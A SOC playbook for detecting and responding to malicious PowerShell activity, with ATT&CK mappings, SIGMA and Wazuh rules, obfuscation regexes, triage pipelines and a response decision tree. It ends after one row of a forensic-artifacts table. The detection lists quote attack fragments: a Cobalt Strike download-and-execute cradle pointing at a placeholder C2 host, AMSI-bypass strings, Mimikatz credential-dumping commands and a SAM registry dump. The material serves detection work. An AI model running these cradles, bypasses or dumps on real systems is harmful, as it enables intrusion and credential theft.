# Playbook: Suspicious PowerShell Activity

## Document Control

| Field | Value |
|-------|-------|
| **Playbook ID** | PB-003 |
| **Version** | 2.0.0 |
| **Release Date** | 2026-02-17 |
| **Classification** | TLP:AMBER |
| **Distribution** | Authorized SOC Personnel Only |
| **Maintainer** | SOC Engineering Team |
| **Review Cycle** | Quarterly |
| **Last Updated** | 2026-02-17 |

## Overview

| Field | Value |
|-------|-------|
| **Severity Range** | Medium to Critical |
| **Automation Level** | Tier 1: Automated, Tier 2: Semi-Automated, Tier 3: Manual |
| **MTTR Target** | < 15 minutes (containment) |
| **Primary Use Case** | Detection and response to malicious PowerShell abuse |
| **Business Impact** | High (potential for data theft, ransomware, lateral movement) |

## MITRE ATT&CK Mapping

### Primary Techniques

| Technique ID | Technique Name | Phase | Prevalence |
|--------------|----------------|-------|------------|
| **T1059.001** | Command and Scripting Interpreter: PowerShell | Execution | Very High |
| **T1027** | Obfuscated Files or Information | Defense Evasion | Very High |
| **T1140** | Deobfuscate/Decode Files or Information | Defense Evasion | High |
| **T1105** | Ingress Tool Transfer | Command & Control | High |
| **T1071.001** | Application Layer Protocol: Web Protocols | Command & Control | High |
| **T1573** | Encrypted Channel | Command & Control | Medium |
| **T1003** | OS Credential Dumping | Credential Access | Medium |
| **T1547** | Boot or Logon Autostart Execution | Persistence | Medium |

### Sub-Techniques Covered

- **T1003.001**: LSASS Memory Dumping via PowerShell
- **T1027.001**: Binary Padding / Obfuscation
- **T1027.010**: Command Obfuscation (Base64, Unicode, Concatenation)
- **T1059.001**: PowerShell Execution (Encoded, Download Cradles, AMSI Bypass)
- **T1105**: File Transfer via Web Protocols (Invoke-WebRequest, Net.WebClient)
- **T1547.001**: Registry Run Keys / Startup Folder Persistence
- **T1070.001**: Indicator Removal - Clear Windows Event Logs
- **T1112**: Modify Registry (Execution Policy, AMSI Settings)

## Description

This playbook provides comprehensive detection, investigation, and response procedures for malicious PowerShell activity. PowerShell, while a critical administrative tool, is the most widely abused scripting interpreter in modern attacks due to its:

- **Fileless execution capabilities**: Direct memory execution without disk writes
- **Built-in obfuscation**: Native encoding and compression support
- **Windows integration**: Deep access to system APIs, WMI, .NET framework
- **Remote management**: Native remoting and lateral movement features
- **Widespread presence**: Pre-installed on all modern Windows systems

### Attack Lifecycle Coverage

This playbook addresses PowerShell abuse across the full attack lifecycle:

1. **Initial Access**: Phishing emails with malicious PowerShell attachments
2. **Execution**: Obfuscated command execution via Office macros, WScript, or direct user interaction
3. **Persistence**: Registry modifications, scheduled tasks, startup scripts
4. **Privilege Escalation**: UAC bypass, token manipulation
5. **Defense Evasion**: AMSI bypass, execution policy bypass, obfuscation
6. **Credential Access**: LSASS dumping, credential harvesting
7. **Discovery**: System enumeration, Active Directory reconnaissance
8. **Lateral Movement**: Remote PowerShell, PsExec-style execution
9. **Collection**: File harvesting, screenshot capture
10. **Command & Control**: C2 beaconing, reverse shells
11. **Exfiltration**: Data staging and transfer

## Detection Criteria

### Comprehensive Wazuh/Sysmon Rule Coverage

#### Sysmon Event Coverage

| Event ID | Event Type | Detection Focus | Priority |
|----------|------------|-----------------|----------|
| **EID 1** | Process Creation | PowerShell execution with suspicious parameters, parent processes, command line obfuscation | Critical |
| **EID 3** | Network Connection | Outbound connections from PowerShell to unknown/malicious IPs, non-standard ports | High |
| **EID 7** | Image Loaded | Loading of suspicious DLLs (mimikatz, reflective injection indicators) | High |
| **EID 10** | Process Access | PowerShell accessing LSASS.exe (credential dumping) | Critical |
| **EID 11** | File Create | PowerShell creating files in suspicious locations (temp, startup, system32) | Medium |
| **EID 13** | Registry Value Set | Execution policy changes, persistence registry keys, AMSI modifications | High |
| **EID 22** | DNS Query | PowerShell DNS queries to suspicious domains, DGA patterns, known C2 infrastructure | Medium |

#### Wazuh Rule Mapping

| Rule Range | Description | Typical Trigger |
|------------|-------------|-----------------|
| **91816** | PowerShell execution policy bypass | `-ExecutionPolicy Bypass` or `-Exec Bypass` |
| **91817** | Encoded PowerShell command | `-EncodedCommand`, `-enc`, `-ec` with Base64 string |
| **91818** | PowerShell download cradle | `Invoke-WebRequest`, `wget`, `curl`, `Net.WebClient`, `DownloadString` |
| **91819** | PowerShell spawned by Office | Parent process: WINWORD.EXE, EXCEL.EXE, POWERPNT.EXE |
| **91820** | PowerShell hidden window execution | `-WindowStyle Hidden` or `-w Hidden` |
| **92000-92099** | Sysmon PowerShell process creation (EID 1) | Comprehensive command line analysis |
| **92100-92199** | Sysmon PowerShell network activity (EID 3) | C2 communication detection |
| **92200-92299** | Sysmon PowerShell file operations (EID 11) | Malicious payload drops |
| **92300-92399** | Sysmon PowerShell registry modifications (EID 13) | Persistence and evasion |
| **92400-92499** | Sysmon PowerShell LSASS access (EID 10) | Credential theft attempts |
| **92500-92599** | Sysmon PowerShell DNS queries (EID 22) | C2 domain resolution |

#### Custom SIGMA Rule Integration

```yaml
# SIGMA Rule: Suspicious PowerShell Encoded Command
title: PowerShell Encoded Command with Download Cradle
id: wazuh-ps-001
status: production
description: Detects PowerShell execution with both encoded commands and download functionality
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1105/
logsource:
  category: process_creation
  product: windows
detection:
  selection_encoded:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-enc'
      - '-EncodedCommand'
      - '-ec'
  selection_download:
    CommandLine|contains:
      - 'Net.WebClient'
      - 'DownloadString'
      - 'DownloadFile'
      - 'Invoke-WebRequest'
      - 'iwr'
      - 'wget'
      - 'curl'
  condition: selection_encoded and selection_download
falsepositives:
  - Legitimate admin scripts (verify code signing)
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.command_and_control
  - attack.t1105
```

```yaml
# SIGMA Rule: PowerShell AMSI Bypass
title: PowerShell Anti-Malware Scan Interface Bypass
id: wazuh-ps-002
status: production
description: Detects attempts to disable or bypass Windows AMSI
logsource:
  category: process_creation
  product: windows
detection:
  selection_process:
    Image|endswith: '\powershell.exe'
  selection_amsi:
    CommandLine|contains:
      - 'AmsiScanBuffer'
      - 'amsiInitFailed'
      - 'AmsiUtils'
      - 'amsi.dll'
      - '[Ref].Assembly.GetType'
      - 'SetValue($null,$true)'
      - 'Management.Automation.AmsiUtils'
  condition: selection_process and selection_amsi
falsepositives:
  - Security testing (authorized penetration tests only)
level: critical
tags:
  - attack.defense_evasion
  - attack.t1562.001
```

### Obfuscation Detection Patterns

#### Encoding Techniques

| Pattern | Example | Detection Method | Severity |
|---------|---------|------------------|----------|
| **Base64 Encoding** | `-enc JABhAD0AMQ==` | Regex: `[A-Za-z0-9+/]{20,}={0,2}` | High |
| **-EncodedCommand** | `-EncodedCommand <Base64>` | Parameter detection | High |
| **Unicode Encoding** | `\u0049\u006E\u0076` | Regex: `\\u[0-9A-Fa-f]{4}` | Medium |
| **Hex Encoding** | `0x49,0x6E,0x76` | Regex: `0x[0-9A-Fa-f]{2}` | Medium |
| **Compression/Deflation** | `IO.Compression.DeflateStream` | String matching | High |
| **SecureString** | `ConvertTo-SecureString` with encoded strings | API call detection | Medium |

#### Obfuscation Techniques

| Technique | Example | Detection Regex | Confidence |
|-----------|---------|-----------------|------------|
| **String Concatenation** | `"Inv"+"oke-"+"Expression"` | `"[^"]+"\s*\+\s*"[^"]+"` | Medium |
| **Variable Substitution** | `$a='Invoke';$b='Expression';&$a-$b` | Complex variable chains | High |
| **Tick Marks** | ``I`nvo`ke-Expr`ession`` | Backtick in cmdlet names | High |
| **Environment Variables** | `$env:ComSpec` abuse | Suspicious env var usage | Medium |
| **Format String Obfuscation** | `"{0}{1}" -f "Inv","oke"` | `-f` operator with split strings | High |
| **Character Replacement** | `.Replace('x','I')` chains | Multiple `.Replace()` calls | High |
| **Character Code Conversion** | `[char]73+[char]110` | `[char]` casting patterns | High |
| **Invoke-Expression Chains** | `IEX(IEX(...))` | Nested IEX/ICM patterns | Critical |
| **Alias Abuse** | `iex`, `icm`, `sal`, `gcm` | Cmdlet alias usage in encoded commands | Medium |
| **ScriptBlock Invoke** | `[ScriptBlock]::Create($cmd).Invoke()` | ScriptBlock dynamic creation | High |

### Known Attack Framework Signatures

#### Cobalt Strike

```powershell
# Cobalt Strike PowerShell Stager Pattern
Indicators:
- IEX(New-Object Net.WebClient).DownloadString('http://[C2]/')
- [System.Net.ServicePointManager]::ServerCertificateValidationCallback
- System.IO.Compression.GzipStream
- System.Reflection.Assembly]::Load
- Beacon implant naming: /dpix, /pixel.gif, /__utm.gif

Detection Confidence: 95%+ if 3+ indicators present
```

#### PowerShell Empire

```powershell
# Empire Framework Patterns
Indicators:
- $ser=[System.Runtime.Serialization.Formatters.Binary.BinaryFormatter]
- -join[char[]](RANDOM_ARRAY)
- $AES.Key=$KEY;$AES.IV=$IV
- $EDATA=...;$MS=New-Object System.IO.MemoryStream
- Agent naming: /admin/get.php, /news.php

Detection Confidence: 90%+ if 3+ indicators present
```

#### PowerSploit / PowerView

```powershell
# PowerSploit Toolkit Signatures
Common Modules:
- Invoke-Mimikatz
- Invoke-ReflectivePEInjection
- Get-GPPPassword
- Invoke-TokenManipulation
- Get-NetDomain, Get-NetUser, Get-NetComputer

Detection: Function name matching + parameter analysis
Confidence: High (>85%)
```

#### Mimikatz PowerShell Variants

```powershell
# Mimikatz PowerShell Detection
Keywords:
- sekurlsa::logonpasswords
- lsadump::
- privilege::debug
- $mimi, $mimikatz
- [System.Runtime.InteropServices.Marshal]::Copy in credential context

Detection Confidence: 95%+
```

#### SharpHound / BloodHound Collection

```powershell
# BloodHound Data Collection
Indicators:
- Invoke-BloodHound
- SharpHound
- Get-NetDomain + Get-NetDomainController + Get-NetUser (rapid succession)
- JSON export with AD object properties
- .bloodhound file creation

Detection Confidence: 90%+
```

### Primary Indicators

#### Suspicious Command Line Parameters

| Parameter | Purpose (Legitimate) | Abuse Pattern | Risk Level |
|-----------|---------------------|---------------|------------|
| `-ExecutionPolicy Bypass` | Override script execution policy | Evade security controls | High |
| `-NoProfile` | Skip profile loading | Avoid logging/detection | Medium |
| `-NonInteractive` | No user prompts | Automated malicious execution | Medium |
| `-WindowStyle Hidden` | Background execution | Stealth execution | High |
| `-EncodedCommand` | Execute Base64 encoded script | Obfuscate malicious payload | Critical |
| `-NoLogo` | Suppress banner | Clean output for automation | Low |
| `-NoExit` | Keep session open | Persistent backdoor | Medium |
| `-Command` | Execute command | Delivery mechanism for payloads | Medium |
| `-File` | Execute script file | Less suspicious than -Command | Low |

#### Network Activity Patterns

| Pattern | PowerShell Command | Typical C2 Indicators | Detection Confidence |
|---------|-------------------|----------------------|---------------------|
| **HTTP Download** | `Invoke-WebRequest`, `iwr`, `wget` | Non-corporate domains, IP addresses | High |
| **WebClient Download** | `(New-Object Net.WebClient).DownloadString()` | Direct IP connections, pastebin, shorteners | Very High |
| **Direct Socket** | `System.Net.Sockets.TCPClient` | Non-standard ports (4444, 8080, 443 to non-web) | Critical |
| **BITS Transfer** | `Start-BitsTransfer` | Large file transfers to unknown hosts | Medium |
| **DNS Tunneling** | Rapid `Resolve-DnsName` queries | Long subdomain strings, high entropy | High |
| **Web Protocols** | `Invoke-RestMethod` to unknown APIs | JSON/XML data exfil patterns | Medium |

#### Credential Access Indicators

| Technique | PowerShell Pattern | MITRE | Detection Method |
|-----------|-------------------|-------|------------------|
| **LSASS Dumping** | Process handle to lsass.exe (PID lookup) | T1003.001 | Sysmon EID 10 |
| **Registry SAM Dump** | `reg save HKLM\SAM` via PowerShell | T1003.002 | Command line + file creation |
| **Credential Prompt** | `Get-Credential` in unexpected context | T1056.002 | Command line analysis |
| **Token Manipulation** | `[System.Security.Principal.WindowsIdentity]` | T1134 | API call detection |
| **DCSync** | `Get-ADReplAccount`, DRSUAPI calls | T1003.006 | Network + command correlation |

### High-Confidence Detection Logic

```yaml
critical_severity_triggers:
  # Scenario 1: Office Document Spawns PowerShell
  - name: "Office Macro PowerShell Execution"
    conditions:
      - parent_process: ["WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE"]
      - process: "powershell.exe"
      - command_contains: ["-enc", "-EncodedCommand", "DownloadString", "IEX"]
    confidence: 95%
    severity: Critical
    mitre: [T1566.001, T1059.001]

  # Scenario 2: WScript/CScript Spawns PowerShell
  - name: "Script Host PowerShell Chain"
    conditions:
      - parent_process: ["wscript.exe", "cscript.exe", "mshta.exe"]
      - process: "powershell.exe"
    confidence: 90%
    severity: Critical
    mitre: [T1059.001, T1059.005, T1059.007]

  # Scenario 3: Encoded Command + Download Cradle
  - name: "Encoded Download Execution"
    conditions:
      - command_contains: ["-enc", "-EncodedCommand", "-ec"]
      - decoded_command_contains: ["DownloadString", "DownloadFile", "WebClient", "Invoke-WebRequest"]
    confidence: 98%
    severity: Critical
    mitre: [T1059.001, T1105, T1027]

  # Scenario 4: AMSI Bypass Detected
  - name: "Anti-Malware Bypass"
    conditions:
      - command_contains: ["AmsiScanBuffer", "amsiInitFailed", "AmsiUtils"]
    confidence: 99%
    severity: Critical
    mitre: [T1562.001, T1059.001]

  # Scenario 5: LSASS Process Access
  - name: "Credential Dumping Attempt"
    conditions:
      - source_process: "powershell.exe"
      - target_process: "lsass.exe"
      - access_rights: ["PROCESS_VM_READ", "PROCESS_QUERY_INFORMATION"]
    confidence: 95%
    severity: Critical
    mitre: [T1003.001]

high_severity_triggers:
  # Scenario 6: Execution Policy Bypass + Hidden Window
  - name: "Stealth Execution Pattern"
    conditions:
      - command_contains: ["-ExecutionPolicy Bypass", "-Exec Bypass"]
      - command_contains: ["-WindowStyle Hidden", "-w Hidden"]
      - network_connection: true
    confidence: 80%
    severity: High
    mitre: [T1059.001, T1071.001]

  # Scenario 7: Reflective PE Injection
  - name: "Reflective Assembly Loading"
    conditions:
      - command_contains: ["[Reflection.Assembly]::Load", "Invoke-ReflectivePEInjection"]
    confidence: 85%
    severity: High
    mitre: [T1055.001, T1059.001]

  # Scenario 8: Persistence Establishment
  - name: "PowerShell Persistence"
    conditions:
      - registry_modification: ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"]
      - source_process: "powershell.exe"
    confidence: 75%
    severity: High
    mitre: [T1547.001]

medium_severity_triggers:
  # Scenario 9: Base64 Encoding Without Network
  - name: "Simple Encoded Execution"
    conditions:
      - command_contains: ["-enc", "-EncodedCommand"]
      - network_connection: false
      - parent_process_not: ["WINWORD.EXE", "EXCEL.EXE", "wscript.exe"]
    confidence: 60%
    severity: Medium
    mitre: [T1059.001, T1027]
```

## Decision Tree

```
┌─────────────────────────────────────────────────────┐
│  PowerShell Execution Detected (Sysmon EID 1)       │
│  Rule: 92000-92099 / SIGMA: wazuh-ps-*              │
└───────────────────┬─────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────┐
│  Extract Command Line & Parent Process              │
│  Agent: Triage Agent (decode_powershell_command)    │
└───────────────────┬─────────────────────────────────┘
                    │
                    ▼
           ┌────────┴────────┐
           │                 │
           ▼                 ▼
    [Encoded?]          [Plain Text]
    -enc/-ec                 │
           │                 │
           ▼                 │
  ┌─────────────┐            │
  │ Decode Base64│           │
  │ or Unicode   │           │
  └──────┬───────┘           │
         │                   │
         └─────────┬─────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────┐
│  Analyze Decoded/Plain Command for IOCs             │
│  - Download cradles (DownloadString, IWR)           │
│  - Obfuscation (IEX, concatenation, tick marks)     │
│  - Credential access (lsass, Get-Credential)        │
│  - AMSI bypass patterns                             │
│  - Network indicators (URLs, IPs)                   │
└───────────────────┬─────────────────────────────────┘
                    │
                    ▼
           ┌────────┴────────┐
           │                 │
           ▼                 ▼
  [Download Cradle?]    [No Download]
         YES                 │
           │                 │
           ▼                 │
┌─────────────────┐          │
│ Extract URLs/IPs│          │
│ Query TI Feeds  │          │
│ (VirusTotal, ET)│          │
└────────┬────────┘          │
         │                   │
         ▼                   │
  [Malicious Domain?]        │
         YES│  NO            │
            │   │            │
            │   └────────────┤
            │                │
            ▼                ▼
┌──────────────────────────────────────┐
│ Check Parent Process Chain           │
│ - Office apps (Word, Excel, Outlook) │
│ - Script hosts (wscript, cscript)    │
│ - Browsers (for download execution)  │
│ - Other PowerShell (nested)          │
└──────────┬───────────────────────────┘
           │
           ▼
  ┌────────┴────────┐
  │                 │
  ▼                 ▼
[Office/Script]  [Other Parent]
  │                 │
  │                 ▼
  │         [Check User Context]
  │         System/Admin? Service?
  │                 │
  │                 ▼
  │         [Check Execution Time]
  │         Off-hours? Weekend?
  │                 │
  └────────┬────────┘
           │
           ▼
┌─────────────────────────────────────────────────────┐
│  Check for Additional Malicious Behaviors           │
│  - Sysmon EID 10: LSASS access?                     │
│  - Sysmon EID 3: Network connection to C2?          │
│  - Sysmon EID 11: File creation in suspicious path? │
│  - Sysmon EID 13: Registry persistence?             │
│  - Sysmon EID 22: DNS query to DGA/suspicious?      │
└───────────────────┬─────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────┐
│              SEVERITY CLASSIFICATION                │
└─────────────────────────────────────────────────────┘
           │
           ▼
  ┌────────┴────────┬────────┬────────┐
  │                 │        │        │
  ▼                 ▼        ▼        ▼
[CRITICAL]      [HIGH]   [MEDIUM]  [LOW]

CRITICAL:
- Office/WScript spawned PowerShell + encoded + download
- AMSI bypass detected
- LSASS access (credential dumping)
- Known framework signature (Cobalt Strike, Empire)
- Lateral movement + credential access

Action: IMMEDIATE containment
- Kill process (if running)
- Isolate host
- Block C2 IPs/domains
- Alert SOC Lead + CISO
Timeline: <1min detect, <5min containment

HIGH:
- Encoded command + download cradle + unknown domain
- Network connection to suspicious IP
- Persistence registry modification
- Reflective PE injection

Action: Urgent investigation + containment
- Decode and analyze full command
- Query threat intelligence
- Correlate with network logs
- Prepare isolation if confirmed malicious
Timeline: <5min triage, <15min containment

MEDIUM:
- Execution policy bypass only
- Encoded command without network activity
- Hidden window with benign parent process
- User context execution during business hours

Action: Standard investigation
- Review command line and decoded content
- Check host history for prior incidents
- Validate against whitelist
- Monitor for escalation
Timeline: <15min triage, <30min decision

LOW:
- Plain text script execution
- Known admin script path
- Signed by corporate certificate
- Standard parameters only

Action: Log and monitor
- Document for baseline
- Consider whitelisting if recurring
- No immediate containment required
Timeline: <30min review
```

## Automated Triage Steps

### 1. Entity Extraction (Triage Agent - Phase 1)

```yaml
entity_extraction:
  priority: critical
  timeout: 30s

  entities:
    - type: host
      source: agent.name
      enrich:
        - asset_criticality
        - os_version
        - installed_security_tools
        - previous_incidents
        - business_owner

    - type: user
      source: data.win.eventdata.user
      enrich:
        - privilege_level
        - department
        - account_type (service/user)
        - last_logon
        - group_memberships

    - type: process
      source: data.win.eventdata.image
      fields:
        - process_name
        - process_path
        - process_id
        - process_guid
        - integrity_level

    - type: parent_process
      source: data.win.eventdata.parentImage
      fields:
        - parent_name
        - parent_command_line
        - parent_id
        - parent_guid

    - type: command_line
      source: data.win.eventdata.commandLine
      actions:
        - decode_base64
        - extract_urls
        - extract_ips
        - extract_file_paths
        - identify_obfuscation

    - type: hash
      source: data.win.eventdata.hashes
      fields:
        - md5
        - sha1
        - sha256
      enrich:
        - virustotal_reputation
        - threat_feed_matches

    - type: network_destination
      source: [data.win.eventdata.destinationIp, data.win.eventdata.destinationHostname]
      enrich:
        - geo_location
        - asn_info
        - reputation_score
        - threat_category

    - type: dns_query
      source: data.win.eventdata.queryName
      enrich:
        - domain_age
        - dga_score
        - threat_intel_match
```

### 2. PowerShell Command Decoding & Analysis (Triage Agent - Phase 2)

```yaml
command_analysis:
  priority: critical
  timeout: 60s

  decoding_pipeline:
    - step: detect_encoding
      methods:
        - base64_detection
        - unicode_detection
        - hex_detection
        - compression_detection

    - step: decode_command
      actions:
        - base64_decode: System.Text.Encoding::Unicode
        - base64_decode: System.Text.Encoding::ASCII
        - unicode_unescape
        - hex_to_ascii
        - decompress_gzip
        - decompress_deflate
      retry: true
      fallback: hex_dump_analysis

    - step: deobfuscate
      techniques:
        - remove_tick_marks
        - resolve_string_concatenation
        - evaluate_format_strings
        - replace_aliases (iex→Invoke-Expression, icm→Invoke-Command)
        - expand_environment_variables

    - step: extract_iocs
      patterns:
        urls:
          - regex: '(https?://[^\s\"\'<>]+)'
          - regex: 'DownloadString\(["\']([^"\']+)["\']\)'
        ips:
          - regex: '\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
        file_paths:
          - regex: '[A-Za-z]:\\(?:[^\\\/:*?"<>|\r\n]+\\)*[^\\\/:*?"<>|\r\n]*'
          - regex: '\\\\[^\\\/:*?"<>|\r\n]+\\[^\\\/:*?"<>|\r\n]+'
        domains:
          - regex: '\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b'
        registry_keys:
          - regex: 'HK(LM|CU|CR|U|CC)\\[^\s]+'

    - step: pattern_matching
      malicious_indicators:
        download_cradles:
          - 'Net.WebClient'
          - 'DownloadString'
          - 'DownloadFile'
          - 'DownloadData'
          - 'Invoke-WebRequest'
          - 'Invoke-RestMethod'
          - 'Start-BitsTransfer'
          - 'certutil.*-urlcache.*http'

        credential_access:
          - 'Get-Credential'
          - 'ConvertFrom-SecureString'
          - 'sekurlsa'
          - 'mimikatz'
          - 'lsass'
          - 'SAM'
          - 'SECURITY'
          - 'Get-GPPPassword'

        amsi_bypass:
          - 'AmsiScanBuffer'
          - 'amsiInitFailed'
          - 'AmsiUtils'
          - '[Ref].Assembly.GetType'
          - 'System.Management.Automation.AmsiUtils'

        obfuscation:
          - 'Invoke-Expression'
          - 'IEX'
          - 'Invoke-Command'
          - 'ICM'
          - '[ScriptBlock]::Create'
          - '[char[]]'
          - '-join'
          - '.Replace('
          - 'FromBase64String'

        persistence:
          - 'CurrentVersion\\Run'
          - 'New-ScheduledTask'
          - 'Register-ScheduledTask'
          - 'WMI.*__EventFilter'
          - 'Start-Process.*-Verb RunAs'

        lateral_movement:
          - 'Invoke-Command.*-ComputerName'
          - 'Enter-PSSession'
          - 'New-PSSession'
          - 'Invoke-WmiMethod'
          - 'winrs'
          - 'psexec'

        discovery:
          - 'Get-NetDomain'
          - 'Get-NetUser'
          - 'Get-NetComputer'
          - 'Get-NetGroup'
          - 'Get-ADUser'
          - 'Get-ADComputer'
          - 'nltest'
          - 'net user /domain'

  output:
    decoded_command: full_text
    obfuscation_score: 0-100
    malicious_patterns_found: list
    extracted_iocs: structured_json
    confidence_score: 0-100
```

### 3. Context Assessment (Investigation Agent - Phase 1)

```yaml
context_assessment:
  priority: high
  timeout: 90s

  assessment_factors:
    parent_process_risk:
      critical_parents:
        - name: ["WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE"]
          risk_score: 90
          reason: "Office applications should not spawn PowerShell"
        - name: ["wscript.exe", "cscript.exe", "mshta.exe"]
          risk_score: 85
          reason: "Script hosts commonly abused for malware delivery"
        - name: ["cmd.exe", "rundll32.exe", "regsvr32.exe"]
          risk_score: 70
          reason: "Indirect PowerShell execution (potential evasion)"

      low_risk_parents:
        - name: ["explorer.exe"]
          risk_score: 30
          reason: "User-initiated (requires additional suspicious indicators)"
        - name: ["svchost.exe", "services.exe"]
          risk_score: 40
          reason: "System process (validate if legitimate service)"

    user_context_risk:
      high_risk:
        - condition: privilege_level == "Administrator" AND user_type == "Standard"
          risk_score: 80
          reason: "Privilege escalation indicator"
        - condition: account_type == "Service" AND unusual_activity == true
          risk_score: 75
          reason: "Service account abuse"
        - condition: user_not_seen_before == true
          risk_score: 70
          reason: "New account activity"

      medium_risk:
        - condition: privilege_level == "Administrator" AND user_type == "Admin"
          risk_score: 40
          reason: "Admin activity (requires validation)"
        - condition: domain_admin_group == true
          risk_score: 60
          reason: "High-value target"

    temporal_risk:
      high_risk:
        - condition: time_of_day NOT IN business_hours
          risk_score: 60
          reason: "After-hours execution"
        - condition: day_of_week IN ["Saturday", "Sunday"]
          risk_score: 65
          reason: "Weekend execution"
        - condition: holiday == true
          risk_score: 70
          reason: "Holiday execution"

      low_risk:
        - condition: time_of_day IN business_hours AND day_of_week IN weekdays
          risk_score: 20
          reason: "Normal business hours"

    host_history_risk:
      critical:
        - condition: previous_malware_infection == true
          risk_score: 85
          reason: "Known compromised host"
        - condition: recent_suspicious_activity_count > 5
          risk_score: 75
          reason: "Pattern of suspicious behavior"

      medium:
        - condition: vulnerability_scan_findings > 0
          risk_score: 50
          reason: "Known vulnerabilities present"
        - condition: patch_compliance < 80%
          risk_score: 55
          reason: "Poor patch hygiene"

    network_risk:
      critical:
        - condition: destination_ip IN threat_feed
          risk_score: 95
          reason: "Known malicious infrastructure"
        - condition: destination_domain IN dga_pattern
          risk_score: 90
          reason: "Domain Generation Algorithm detected"
        - condition: destination_port IN [4444, 4445, 8080, 31337]
          risk_score: 80
          reason: "Common C2 ports"

      high:
        - condition: destination_country NOT IN allowed_countries
          risk_score: 70
          reason: "Unexpected geographic destination"
        - condition: destination_asn IN suspicious_asns
          risk_score: 65
          reason: "Suspicious hosting provider"

  risk_calculation:
    formula: |
      total_risk = (
        parent_process_risk * 0.25 +
        user_context_risk * 0.15 +
        temporal_risk * 0.10 +
        host_history_risk * 0.15 +
        network_risk * 0.25 +
        command_pattern_risk * 0.10
      )

    severity_thresholds:
      - score: 0-30 → Low
      - score: 31-60 → Medium
      - score: 61-80 → High
      - score: 81-100 → Critical
```

### 4. Threat Intelligence Enrichment (Investigation Agent - Phase 2)

```yaml
threat_intelligence:
  priority: high
  timeout: 120s

  sources:
    virustotal:
      queries:
        - type: file_hash
          fields: [md5, sha1, sha256]
          threshold: 5_positives
        - type: url
          fields: extracted_urls
          threshold: 3_positives
        - type: domain
          fields: extracted_domains
          threshold: 2_positives
        - type: ip
          fields: destination_ips
          threshold: 3_positives

    emerging_threats:
      feeds:
        - compromised_ips
        - known_c2_domains
        - malware_hashes
      match_type: exact

    alienvault_otx:
      pulses:
        - powershell_threats
        - apt_activity
        - ransomware_iocs
      indicator_types: [ip, domain, url, hash]

    abuseipdb:
      query: destination_ips
      confidence_threshold: 75
      categories: [malware, botnet, exploit]

    internal_feeds:
      - previous_incidents_iocs
      - blocked_domains
      - known_bad_hashes
      - sanctioned_countries_ips

  enrichment_output:
    reputation_scores:
      - source: feed_name
      - indicator: ioc_value
      - score: 0-100
      - category: [malware, c2, phishing, exploit]
      - first_seen: timestamp
      - last_seen: timestamp

    threat_classification:
      - malware_family: [emotet, cobalt_strike, empire, etc]
      - attack_stage: [initial_access, execution, persistence, etc]
      - threat_actor: [apt_group, criminal_group, unknown]
      - confidence: 0-100
```

### 5. Correlation & Timeline Construction (Investigation Agent - Phase 3)

```yaml
correlation_engine:
  priority: high
  timeout: 180s

  timeline_construction:
    lookback_period: 2_hours
    lookahead_period: 30_minutes
    pivot_entity: agent_id

    event_collection:
      sysmon_events:
        - eid: 1
          filter: parent_process_guid == ${initial_powershell_guid}
          purpose: "Identify child processes spawned by PowerShell"

        - eid: 3
          filter: process_guid == ${initial_powershell_guid}
          purpose: "Network connections from PowerShell"

        - eid: 7
          filter: process_guid == ${initial_powershell_guid}
          purpose: "DLLs loaded by PowerShell (injection indicators)"

        - eid: 10
          filter: source_process_guid == ${initial_powershell_guid}
          purpose: "Process access (credential dumping)"

        - eid: 11
          filter: process_guid == ${initial_powershell_guid}
          purpose: "Files created by PowerShell"

        - eid: 13
          filter: process_guid == ${initial_powershell_guid}
          purpose: "Registry modifications (persistence)"

        - eid: 22
          filter: process_guid == ${initial_powershell_guid}
          purpose: "DNS queries from PowerShell"

      wazuh_alerts:
        - rule_groups: [sysmon, windows]
          filter: agent.id == ${agent_id}
          purpose: "Correlated security events"

      windows_event_logs:
        - log: Security
          eids: [4688, 4689]  # Process creation/termination
          filter: host == ${hostname}

        - log: PowerShell/Operational
          eids: [4103, 4104]  # Module logging, script block logging
          filter: host == ${hostname}

        - log: Microsoft-Windows-Windows Defender/Operational
          eids: [1116, 1117, 1118, 1119]  # AMSI events
          filter: host == ${hostname}

    attack_chain_construction:
      stages:
        - stage: initial_access
          events: [email_delivery, file_download, usb_insertion]

        - stage: execution
          events: [powershell_process_creation]

        - stage: persistence
          events: [registry_modification, scheduled_task, startup_folder]

        - stage: privilege_escalation
          events: [token_manipulation, uac_bypass, service_creation]

        - stage: defense_evasion
          events: [amsi_bypass, execution_policy_change, log_clearing]

        - stage: credential_access
          events: [lsass_access, registry_sam_access, credential_prompt]

        - stage: discovery
          events: [domain_enumeration, network_scan, system_info]

        - stage: lateral_movement
          events: [remote_powershell, wmi_execution, psexec]

        - stage: collection
          events: [file_enumeration, screenshot_capture, clipboard_access]

        - stage: command_and_control
          events: [network_connection, dns_query, beacon_traffic]

        - stage: exfiltration
          events: [large_upload, compression, encryption]

  pattern_detection:
    sequences:
      - name: "Office Macro to PowerShell Download"
        pattern:
          - WINWORD.EXE process creation
          - powershell.exe child process with encoded command
          - Network connection to external IP
          - File creation in %TEMP%
          - Secondary process execution
        confidence: 95%
        mitre: [T1566.001, T1059.001, T1105]

      - name: "PowerShell Credential Dumping"
        pattern:
          - powershell.exe execution
          - lsass.exe process access (Sysmon EID 10)
          - File creation *.dmp or *.txt
          - Possible network connection (exfiltration)
        confidence: 98%
        mitre: [T1003.001, T1059.001]

      - name: "PowerShell Lateral Movement"
        pattern:
          - powershell.exe with -ComputerName or Enter-PSSession
          - Network connection to internal IPs port 5985/5986
          - Remote process creation
        confidence: 90%
        mitre: [T1021.006, T1059.001]
```

## Forensic Artifacts

### Windows PowerShell Logging

| Log Source | Event ID | Information Captured | Forensic Value | Retention |
|------------|----------|---------------------|----------------|-----------|
| **PowerShell Script Block Logging** | 4104 | Full script content (even obfuscated), deobfuscated commands | Critical - Shows exact malicious code executed | 90 days |
